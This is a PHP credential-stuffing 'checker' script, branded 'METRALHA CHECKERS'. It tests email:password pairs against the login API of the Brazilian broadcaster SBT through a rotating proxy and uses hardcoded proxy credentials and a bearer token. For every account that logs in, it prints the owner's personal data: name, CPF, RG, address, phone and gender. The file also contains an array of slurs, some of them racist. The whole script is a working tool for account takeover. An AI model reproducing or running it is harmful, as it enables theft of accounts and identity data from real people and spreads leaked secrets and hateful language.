<?php


// ================================================================
// =     __  __ _____ _____ ____      _    _     _   _    _       =
// =    |  \/  | ____|_   _|  _ \    / \  | |   | | | |  / \      =
// =    | |\/| |  _|   | | | |_) |  / _ \ | |   | |_| | / _ \     =
// =    | |  | | |___  | | |  _ <  / ___ \| |___|  _  |/ ___ \    =
// =    |_|  |_|_____| |_| |_| \_\/_/   \_\_____|_| |_/_/   \_\   =
// =                                                              =
// =                                                              =
// =       ____ _   _ _____ ____ _  _______ ____  ____            =
// =      / ___| | | | ____/ ___| |/ / ____|  _ \/ ___|           =
// =     | |   | |_| |  _|| |   | ' /|  _| | |_) \___ \           =
// =     | |___|  _  | |__| |___| . \| |___|  _ < ___) |          =
// =      \____|_| |_|_____\____|_|\_\_____|_| \_\____/           =
// =                                                              =
// =                                                              =
// ================================================================


    
    error_reporting(0);
    
    
    function multiexplode($delimiters, $string) {
        $one = str_replace($delimiters, $delimiters[0], $string);
        $two = explode($delimiters[0], $one);
        return $two;
    }
    $lista = $_GET['lista'];
    $email = multiexplode(array(":", "|", ""), $lista)[0];
    $senha = multiexplode(array(":", "|", ""), $lista)[1];
    function getStr2($string, $start, $end) {
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
}
    function getStr($string,$start,$end){
    $str = explode($start,$string);
    $str = explode($end,$str[1]);
    return $str[0];
}


$metraia = array("Paunoseucu", "Fiadaputa", "Maconheiro", "Bolsominion", "Pretofodido");
$girar_arrays = $metraia[array_rand($metraia)];

// ================ // ====================//==========================//============================= // ================================//=================//

$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, 'https://user.sbt.com.br/api/login');
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_PROXY, "http://p.webshare.io:80");
curl_setopt($ini, CURLOPT_PROXYUSERPWD, "xotyjlsh-rotate:vzfrfocr2zg2");
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_COOKIEJAR, getcwd(). "/cookies.txt");
curl_setopt($ini, CURLOPT_COOKIEFILE, getcwd(). "/cookies.txt");
curl_setopt($ini, CURLOPT_HTTPHEADER, array(

'accept: application/json, text/plain, */*',
'authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6InNidC1zaXRlLXByb2QiLCJlbmRwb2ludHMiOlsiKiJdLCJob3N0cyI6WyJodHRwOi8vd3d3LXByb2QudHZzYnQuY29tLmJyIiwiaHR0cDovL3d3dy5zYnQuY29tLmJyIiwiaHR0cHM6Ly93d3cuc2J0LmNvbS5iciIsImh0dHA6Ly9sb2NhbGhvc3Q6NDIwMCJdLCJzZXJ2aWNlcyI6WyIqIl0sImlhdCI6MTU1MzU2MTI5MX0.6GBkl1U9CWUQfXYLPJDl5NLrIVolkcG5eJTKFDGZQEY',
'content-type: application/json',
'origin: https://www.sbt.com.br',
'referer: https://www.sbt.com.br/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36 OPR/89.0.4447.83'

));
curl_setopt($ini, CURLOPT_POSTFIELDS, '{"email":"'.$email.'","password":"'.$senha.'"}');
$resposta = curl_exec($ini);
//$tokendaporra = getStr2($resposta, '"token":"','"');



// ================ // ====================//==========================//============================= // ================================//=================//

$nome_dono = getStr2($resposta, '"name":"','"');
$cpf = getStr2($resposta, '"cpf":"','"');
$rg = getStr2($resposta, '"rg":"','"');
$ano_nasc = getStr2($resposta, '"birthdayYear":"','"');
$celular = getStr2($resposta, '"cellphone":"','"');
$sexo_eu_gosto = getStr2($resposta, '"gender":"','"');


$cidade = getStr2($resposta, '"city":"','"');
$nomerua = getStr2($resposta, '"streetLabel":"','"');
$numero_casa = getStr2($resposta, '"streetNumber":"','"');
$bairro = getStr2($resposta, '"district":"','"');
$referencia = getStr2($resposta, 'streetNumber2":"','"');


// ================ // ====================//==========================//============================= // ================================//=================//
         

if (stripos($resposta, 'token')) {

echo "<span class='badge badge-danger'>#Aprovada</span> $email|$senha  <span class='badge badge-info'>Retorno:</span> Login confirmado.  <span class='badge badge-info'>NOME:</span> $nome_dono  <span class='badge badge-info'>CPF CADASTRADO:</span> $cpf  <span class='badge badge-info'>RG CADASTRADO:</span> $rg  <span class='badge badge-info'>ANO NASC:</span> $ano_nasc  <span class='badge badge-info'>CIDADE:</span> $cidade  <span class='badge badge-info'>NOME RUA:</span> $nomerua <span class='badge badge-info'>NUMERO CASA:</span> $numero_casa <span class='badge badge-info'>BAIRRO:</span> $bairro <span class='badge badge-info'>LOCAL REFERENCIA:</span> $referencia <span class='badge badge-info'>TELEFONE CADASTRADO:</span> $celular <span class='badge badge-info'>GENERO SEXO:</span> $sexo_eu_gosto <br>";

}else {

    echo "<span class='badge badge-danger'>#Reprovada</span> $email|$senha <span class='badge badge-info'>Retorno:</span> $resposta <br>";
}
?>